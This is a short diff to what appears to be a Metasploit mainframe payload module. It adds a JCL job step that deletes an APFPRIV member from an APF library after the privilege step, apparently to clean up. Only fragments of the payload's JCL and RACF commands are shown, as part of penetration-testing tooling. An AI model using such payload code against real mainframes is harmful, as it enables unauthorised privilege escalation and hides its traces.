@@ -23,7 +23,7 @@ require 'msf/base/sessions/mainframe_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-  CachedSize = 3000
+  CachedSize = 3156
   include Msf::Payload::Single
   include Msf::Payload::Mainframe
 
@@ -145,6 +145,12 @@ module MetasploitModule
       " SETR RACL(FACILITY) REF\n" \
       "/*\n" \
       "//SYSIN     DD DUMMY\n" \
-      "//SYSTSPRT  DD SYSOUT=*\n"
+      "//SYSTSPRT  DD SYSOUT=*\n" \
+      "//S3        EXEC PGM=IDCAMS\n" \
+      "//SYSPRINT  DD SYSOUT=*\n" \
+      "//TEMPDD    DD DSN=#{datastore['APFLIB']},DISP=SHR\n" \
+      "//SYSIN     DD *\n" \
+      " DELETE #{datastore['APFLIB']}(APFPRIV) FILE(TEMPDD)\n" \
+      "/*\n" \
   end
 end
